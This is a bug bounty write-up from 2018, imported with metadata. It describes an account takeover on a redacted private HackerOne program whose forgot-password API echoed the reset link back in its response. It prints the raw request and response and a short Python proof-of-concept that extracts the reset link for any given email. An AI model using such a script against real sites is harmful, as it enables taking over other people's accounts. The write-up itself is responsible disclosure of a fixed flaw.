---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-06-25_account-take-over-via-reset-password.md
original_filename: 2018-06-25_account-take-over-via-reset-password.md
title: Account Take over via reset password
category: documents
detected_topics:
- otp
- rate-limit
- command-injection
- password-reset
tags:
- imported
- documents
- otp
- rate-limit
- command-injection
- password-reset
language: en
raw_sha256: f03e56d68c674eb9a5fa8a9f933338fd8924fe7d48e6c1cc66cee6781f2fd018
text_sha256: d5f9d6700c0d04bdd45db71d7d17e675a03a8a73ab8c1c8afbe08a2f4cf019d4
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Account Take over via reset password

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-06-25_account-take-over-via-reset-password.md
- Source Type: markdown
- Detected Topics: otp, rate-limit, command-injection, password-reset
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `f03e56d68c674eb9a5fa8a9f933338fd8924fe7d48e6c1cc66cee6781f2fd018`
- Text SHA256: `d5f9d6700c0d04bdd45db71d7d17e675a03a8a73ab8c1c8afbe08a2f4cf019d4`


## Content

---
title: "Account Take over via reset password"
url: "https://medium.com/@yassergersy/account-take-over-via-reset-password-f2e9d887bce1"
authors: ["Yasser Gersy (@yassergersy)"]
bugs: ["Password reset", "Account takeover"]
bounty: "1,500"
publication_date: "2018-06-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5827
scraped_via: "browseros"
---

# Account Take over via reset password

Account Take over via reset password
Yasser Gersy
Follow
3 min read
·
Jun 25, 2018

172

1

Hi

The old story was deleted as per team request , it was containing a reference that discloses the program , if this also may cause any type of impact , please reach me to edit or delete .

Recently i have been asked many times by Hackerone hackers about my last finding which appeared on hacktivity page disclosing the bounty , Ok i’m discussing it here.

It’s was 17 June , and Egypt has been defeated 0:1 by Uruguay :(.
All Egyptians are sad and complaining , the same as i, i have to find something that may make my day and forget what Gimenez scored .

Five days before , I got invited by Xprogram which is private on hackerone , sorry for redacting and not disclosing it.

Let’s take a look , After some reconnaissance , i managed to test the login function which is my favorite .

I tried to reset my password , navigated to

https://app.xprogram.com/account/forget_password

I filled my email and submitted the request , To be honest i sent the request to burp repeater/intruder to find if i can inject random host header or see if it’s vulnerable to brute force so we may report a missing rate limit or try token generation guessing attack by reverse-engineering tokens .
The main application was sitting on app.xprogram.com and all requests were being sent cross-domain to their API at api.xprogram.com
So if you managed to reset or login you have to navigate to

https://app.xprogram.com/account

And a cross domain request will be issued to api.xprogram.com depending on what action you want to proceed

Get Yasser Gersy’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

This is not necessary to speak about , but i’m giving an excuse for the developer who made the mistake and printed all parameters back .
The vulnerability we are talking about is returning all parameters back in HTTP response.

Press enter or click to view image in full size

Anyway, the final request when you press send me link to reset my password

POST /access/forgotPassword HTTP/1.1 
Host: api.xprogram.com
User-Agent: Mozilla 
Accept: application/json, text/plain, */* 
Accept-Language: en-US,en;q=0.5 
Content-Type: application/json;charset=utf-8 
Referer: https://app.xprogram.com/account/forgot-password 
Content-Length: 52 
origin: https://app.xprogram.com 
Cookie: redacted=yes;
Connection: close 
{“email”:”foobar@gmail.com”}

The shock
The response was :

HTTP/1.1 200 OK
{“name”:”send-email”,”resetPasswordLink”:”https://app.xprogram.com/account/reset-password?token=xxxxxxxxxzzzzzzzzyyyyyyyy" , “many-other-parameters”:”many values”}

Really , yes the reset-password link was returned in response.
The report was too short ,
>
guys the reset-password link is returned in response , any one can hack anyone

I said it’s not enough , i wrote a python script to help the team to easily replicate the exploit.

#!/bin/python
import sys, requests
print ‘ — — — — — — — — — — — — — — — — — — \n\n’
em=sys.argv[1]
try:
 burp0_url = “https://api.xprogram.com:443/access/forgotPassword"
 burp0_cookies = {“cookie_not_useful”:”vallxxx”}
 burp0_headers = { “User-Agent”: “Mozilla”, “Accept”: “application/json, text/plain, */*”, “Accept-Language”: “en-US,en;q=0.5”, “Content-Type”: “application/json;charset=utf-8”, “Referer”: “https://app.xprogram.com/account/forgot-password", “origin”: “https://app.xprogram.com", “Connection”: “close”}
 burp0_json={“email”: em, “language”: “en”}
 r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
 print r.text.encode(‘utf-8’).split(‘resetPasswordLink”:”’)[1].split(‘“‘)[0]
 
except:
 print error

When running the script with email as argument

As said before , the response will contain the link to reset any password .
Yeah , these 17 lines are able to hack any account on the platform.

The script was unnecessary but it helped them , and i got a nice feedback for it.

I had a very nice experience , i accidentally violated the terms , however the team was tolerant and respectful and did not cancel my invitation.

Tip:Always review responses carefully .
Happy hacking ,

TimeLine
June 17, 2018 12:18:58 Reported
June 18, 2018 02:12:15 Triaged
June 18, 2018 14:45:26 Fixed
June 18, 2018 14:46:05 Bounty awarded 1500$
